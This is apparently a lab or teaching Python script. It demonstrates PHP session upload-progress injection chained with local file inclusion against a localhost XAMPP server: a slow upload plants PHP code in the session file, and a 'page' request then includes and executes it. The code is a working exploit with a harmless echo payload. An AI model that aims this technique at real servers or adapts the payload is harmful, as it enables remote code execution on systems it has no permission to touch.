import requests
import threading
import time
import os

TARGET_URL = "http://localhost:8000/index.php"
SESSION_ID = "hacker_demo_1337"
TMP_DIR = r"E:\xmapp\tmp"
SESSION_FILE = os.path.join(TMP_DIR, f"sess_{SESSION_ID}")
PAYLOAD = '<?php echo "\n[!] EXECUTED FROM SESSION FILE: PHP_SESSION_UPLOAD_PROGRESS INJECTION SUCCESSFUL!\n"; ?>'

def slow_uploader():
    """
    Simulates sending a large/slow multipart file upload.
    While this stream is sending, PHP's engine creates the session file on disk!
    """
    def chunk_generator():
        # Yield dummy data slowly over 3 seconds to keep the session alive
        for _ in range(30):
            yield b"A" * 1024
            time.sleep(0.1)

    data = {
        "PHP_SESSION_UPLOAD_PROGRESS": PAYLOAD
    }
    files = {
        "dummy_file": ("exploit.txt", chunk_generator(), "text/plain")
    }
    cookies = {
        "PHPSESSID": SESSION_ID
    }
    try:
        requests.post(TARGET_URL, data=data, files=files, cookies=cookies, timeout=10)
    except Exception as e:
        pass

def observer_and_trigger():
    """
    Observes the file on disk during the upload window, and triggers LFI.
    """
    time.sleep(0.5) # Wait for upload to start and PHP to create the file
    print(f"[*] Checking disk for session file: {SESSION_FILE}")
    
    if os.path.exists(SESSION_FILE):
        print(f"[+] FOUND ON DISK! PHP automatically created: {SESSION_FILE}")
        with open(SESSION_FILE, 'r', errors='ignore') as f:
            content = f.read()
        print(f"[+] File Contents on Disk:\n-------------------------\n{content}\n-------------------------")
        
        # Now trigger the Local File Inclusion (LFI)
        print(f"[*] Triggering LFI via: {TARGET_URL}?page={SESSION_FILE}")
        resp = requests.get(TARGET_URL, params={"page": SESSION_FILE})
        print(f"\n[+] Server Response to Inclusion:")
        print("=========================================")
        for line in resp.text.splitlines():
            if "EXECUTED FROM SESSION FILE" in line or "PHP_SESSION_UPLOAD_PROGRESS" in line:
                print(f"👉 {line.strip()}")
        print("=========================================")
    else:
        print(f"[-] File was not caught on disk. Will retry...")

if __name__ == "__main__":
    print("==================================================")
    print("[*] PHP_SESSION_UPLOAD_PROGRESS Exploit Mechanics Lab")
    print("==================================================")
    
    t_upload = threading.Thread(target=slow_uploader)
    t_watch = threading.Thread(target=observer_and_trigger)
    
    t_upload.start()
    t_watch.start()
    
    t_upload.join()
    t_watch.join()
    print("\n[*] Lab demonstration complete.")
